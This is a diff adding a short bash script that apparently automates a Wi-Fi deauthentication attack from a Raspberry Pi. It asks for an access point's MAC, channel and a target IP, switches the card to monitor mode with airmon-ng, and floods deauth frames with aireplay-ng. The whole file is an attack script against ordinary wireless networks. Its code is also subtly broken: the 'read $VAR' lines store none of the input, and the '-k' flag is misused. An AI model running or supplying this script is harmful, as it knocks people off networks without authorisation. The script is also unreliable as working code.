@@ -1,0 +1,26 @@
+#! /bin/bash
+
+# a recreation of airnipe-ip from memory/it's freaking easy.
+# brianc2788@gmail.com
+# used to send deauth signals from the pi, remotely.
+
+echo '::Airsnipe-IP::'
+echo 'you will need root/sudo privs'
+echo 'Enter AP MAC: '
+read $APMAC
+echo 'Enter AP channel: '
+read $APCH
+echo 'Enter target IP: '
+read $TARIP
+echo 'Enter # of deauths: '
+read $DANUM
+
+echo '::starting script... please wait::'
+
+airmon-ng check kill
+airmon-ng start wlan0 $APCH
+aireplay-ng --deauth $DANUM -a $APMAC -k $TARIP wlan0mon
+airmon-ng stop wlan0mon
+service networking restart
+
+echo '::script exiting::'
